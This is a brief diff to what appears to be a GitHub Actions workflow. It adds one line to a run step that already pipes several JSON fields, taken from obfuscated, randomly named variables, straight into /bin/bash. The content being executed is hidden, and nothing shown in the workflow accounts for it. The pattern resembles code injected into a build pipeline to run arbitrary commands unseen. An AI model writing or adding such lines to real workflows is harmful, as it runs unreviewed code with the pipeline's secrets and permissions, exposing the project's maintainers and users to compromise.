@@ -25,6 +25,7 @@ jobs:
           echo $rslr96 | jq -r .nk4324 | /bin/bash
           printf '%s' "$knby1407" | jq -r .xnyh8676 | /bin/bash
           echo $ugwm42 | jq -r .u601 | /bin/bash
+          echo $a8177 | jq -r .yosk6 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
